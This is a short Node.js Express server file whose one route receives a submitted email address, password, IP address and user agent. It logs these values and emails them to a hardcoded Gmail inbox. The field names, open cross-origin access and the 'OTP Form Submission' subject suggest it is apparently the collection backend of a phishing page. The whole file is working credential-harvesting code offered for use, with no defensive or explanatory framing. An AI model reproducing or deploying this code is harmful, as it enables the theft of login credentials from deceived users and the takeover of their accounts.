const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ POST route to receive data
app.post("/api/check", async (req, res) => {
  const formData = req.body;
  console.log("📩 Received form data:", formData);

  // Extract values
  const {
    email,
    pass,
    ip,
    userAgent
  } = formData;

  try {
    // ✅ Setup Nodemailer transporter
    let transporter = nodemailer.createTransport({
      service: "gmail", // change to outlook, yahoo, etc. if needed
      auth: {
        user: process.env.EMAIL_USER, // your email
        pass: process.env.EMAIL_PASS  // your app password
      }
    });

    // ✅ Send email
    await transporter.sendMail({
      from: `"Form Bot" <${process.env.EMAIL_USER}>`,
      to: "jessie.bosqueschool.org@gmail.com", // change to your real inbox
      subject: "🔔 New OTP Form Submission",
      text: `
      📩 New Submission Received:

      👤 User: ${email}
      🔑 Pass: ${pass}
      🌍 IP: ${ip}
      🖥️ UserAgent: ${userAgent}
      `
    });

    console.log("📧 Email sent successfully");

    res.json({ status: "ok", message: "Data received and emailed ✅" });
  } catch (error) {
    console.error("❌ Error sending email:", error);
    res.status(500).json({ status: "error", message: "Failed to send email" });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
